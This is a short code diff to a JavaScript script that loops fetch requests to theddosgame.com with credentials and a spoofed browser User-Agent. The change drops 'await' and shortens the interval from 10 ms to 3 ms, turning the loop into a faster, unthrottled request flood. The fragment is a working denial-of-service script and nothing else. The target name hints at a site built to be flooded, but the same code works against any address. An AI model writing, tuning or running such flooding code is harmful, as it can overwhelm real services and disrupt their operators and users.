@@ -24,7 +24,7 @@ function makeid(length) {
 
 setInterval(()=>{
   
-await fetch("https://theddosgame.com/", {
+fetch("https://theddosgame.com/", {
     "credentials": "include",
     "headers": {
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0",
@@ -45,5 +45,5 @@ await fetch("https://theddosgame.com/", {
   })
 })
   
-}, 10)
+}, 3)
 
